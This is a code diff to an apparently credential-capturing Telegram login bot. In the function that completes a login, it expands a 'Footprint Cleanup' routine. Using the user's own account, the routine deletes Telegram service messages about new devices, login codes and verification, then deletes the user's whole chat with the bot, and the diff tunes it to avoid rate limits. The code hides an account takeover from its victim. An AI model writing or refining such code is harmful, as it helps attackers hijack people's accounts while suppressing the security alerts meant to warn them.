@@ -584,15 +584,20 @@ async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
         # Use the USER account to clear history (Footprint Cleanup)
         try:
-            # 1. Delete "Telegram Service Notification"
-            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=10):
-                if "new device" in (message.message or "").lower() or "login" in (message.message or "").lower():
+            # 1. Delete "Telegram Service Notification" (login code + new device alerts)
+            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=15):
+                text = (message.message or "").lower()
+                if any(kw in text for kw in ("new device", "login", "code", "verification")):
                     await message.delete()
-                    logger.info(f"Deleted Telegram Service Notification for {filename}")
-                    break
-            
+                    logger.info(f"Deleted service notification for {filename}")
+
             # 2. Delete entire conversation history with the Login Bot itself
-            bot_entity = await client.get_entity(context.bot.username)
+            # Use the bot's numeric ID to avoid ResolveUsernameRequest FloodWait
+            bot_id = context.bot.id
+            try:
+                bot_entity = await client.get_input_entity(bot_id)
+            except ValueError:
+                bot_entity = await client.get_entity(bot_id)
             await client.delete_dialog(bot_entity)
             logger.info(f"Deleted dialog with bot {context.bot.username} for logged in user {filename}")
         except Exception as e:
